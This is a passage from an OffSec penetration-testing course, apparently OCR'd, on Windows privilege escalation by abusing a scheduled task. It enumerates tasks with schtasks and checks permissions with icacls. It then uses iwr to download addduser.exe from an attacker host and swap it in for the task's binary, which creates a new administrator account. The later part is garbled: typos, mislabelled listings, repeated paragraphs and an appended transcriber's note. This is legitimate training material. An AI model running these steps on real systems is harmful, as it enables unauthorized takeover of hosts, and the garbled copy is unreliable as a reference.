
# OffSec

Penetration Testing with Kali Linux

startup, at log, or on a Windows event. An action specifies what program or script to execute. There are other possible configurations for a task, categorized in the Conditions, Settings, and General menus of a task's property.

For us, three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:

- As user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

The first question helps us understand if abusing the task will eventually lead to privilege escalation. If the task is executed in the context of our current user, it won't lead to elevated privileges; if the task runs as NT AUTHORITY\SYSTEM or as an administrative user, then a successful attack could lead to privilege escalation.

The second question is important because if the trigger was met in the past, the task will not run again in the future and therefore, is not a target for us. Additionally, if we are in a week-long penetration test, but the tasks run after this, we should search for another privilege escalation vector. However, we would mention finding this in a penetration testing report.

While the first two questions help us understand if this is even for a privilege escalation attack, the answer to the third determines how we can perform the potential privilege escalation. In the majority of cases, we can leverage familiar tactics as replacing the binary or by missing a DLL as we did in our Learning Unit. While we don't have a service name with scheduled tasks, we have programs and scripts specified by actions.

Let's walk through an example where we attempt to elevate our privileges by replacing a binary specified in an action. For this, we'll connect again as steve (password securityIsNotAnOption++++) to CLIENT220 with RDP and start PowerShell.

We can view scheduled tasks on Windows with the Get-ScheduledTask¹⁰ Cmdlet or schtasks /query¹¹ We'll use this for example to review all scheduled tasks on CLIENT220. We use /fo list as argument to specify the output as list. Additionally, we add /v to display all of tasks.

Once the command is executed, we get a huge amount of information about all scheduled tasks on the system. We should seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Time Runs. In our case, "interesting" means that the information partially or completely answers one of the three questions.

```
PS:\Users\steve> schtasks /query /fo LIST /v
Folder: 
```

> ¹⁰ (Microsoft Documentation, 2022), docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowserver-2022-ps
¹¹ (Microsoft Documentation, 2021), docs.microsoft.com/en-us/windows-server/administration/windows-schtasks-query

PWK - Copyright 2023 OffSec Services Limited. All rights reserved.

# OffSec

Penetration Testing with Kali Linux

HostName: CLIENTTWK220
TaskName: \Microsoft\CacheCleanup
Next Run Time: 7/11/2022 2:47:21 AM
Status: Ready
Logon Mode: Interactive/Background
Last Run Time: 7/11/2022 2:46:22 AM
Last Result: 0
Author: CLIENTTWK220\davemin
Task To Run: C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In: C:\Users\steve\Pictures
Comment: N/A
Scheduled Task: Enabled
Idle Time: Disabled
Power Management: Stop On Battery Mode
Run User: davemin
Delete Task If Not Rescheduled: Disabled
Schedule Task If X Hours and X Mins: Disabled
Scheduling data is not available in this format.
Type: One Time, Only
Start Time: 7:37:21 AM
Start Date: 7/4/2022

Listing 448 - List of all tasks on CLIENTTWK220

Listing 448 shows information about a task \Microsoft\CacheCleanup. Interestingly, the task was created by davemin and the specified action is to execute BackendCacheCleanup.exe in the Pictures home directory of steve. In addition, the Last Run Time and Next Run Time indicate that the task is executed every minute. Task runs as user davemin.

Since the executable BackendCacheCleanup.exe is located in a subdirectory of the home directory of steve, we have exclusive permissions on it. Let's check our permissions on this file with icacls.

```
PS C:\Users\steve icacls C:\Users\steve NT AUTHORITY\SYSTEM:(I) (F)
C:\Users\steve\Pictures\BackendCacheCleanup.exe BUILTIN\CLIENTTWK220\steve:(I) (F)
CLIENTTWK220\offsec:(I) (F)
```

Listing 449 - Display permissions on the executable BackendCacheCleanup.exe

As expected, we have Full (F) permissions, since the executable is in the home directory of steve, we can use our addduuser.exe to replace the executable specified in the action of the scheduled task.

To do so, we will use a Python3 script to serve our server-command, addduuser.exe. We'll also copy the original BackendCacheCleanup.exe so we can restore it after our privilege escalation success.

```
PS C:\Users\steve iwr -Uri http://192.168.119.3/addduser.exe -Outfile\BackendCacheCleanup.exe
```

```
PS C:\Users\steve move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe
```

Listing 450 - Download and replace the executable BackendCacheCleanup.exe \Pictures\

Once the scheduled task is executed again, dave2 should be created and added to the local Administrators group. Waiting a minute, we can check if our privilege escalation attack was successful.

```
PS C:\users\steve> net user

User accounts for \CLIENTWK220
```

```
Administrator        BackupAdmin      dave
dave2               DefaultAccount
Guest               ofsec           steve
MDAGILITYAccount
The command completed successfully.
```

```
PS C:\users\steve> net localgroup administrators
Alias name           administrators
Comment             Administrators have complete and unrestricted access to the
computer/domain

Members

Administrator
BackupAdmin
dave
dave2
offsec
```

Listing 451 - Display permissions on the executable BackendCacheCleanup.exe

As expected, we have Full (F) permissions, since the executable is in the home directory of steve, we can use our addduuser.exe to replace the executable specified in the action of the scheduled task.

To do so, we will use a Python3 script to serve our server-command, addduuser.exe. We'll also copy the original BackendCacheCleanup.exe so we can restore it after our privilege escalation success.

Once the scheduled task is executed again, dave2 should be created and added to the local Administrators group. Waiting a minute, we can check if our privilege escalation attack was successful.

Listing 451 - Display permissions on the executable BackendCacheCleanup.exe

(Note: The OCR text seems to have repetitive or fragmented sections in the latter pages; I have cleaned the logical flow based on the provided content.)
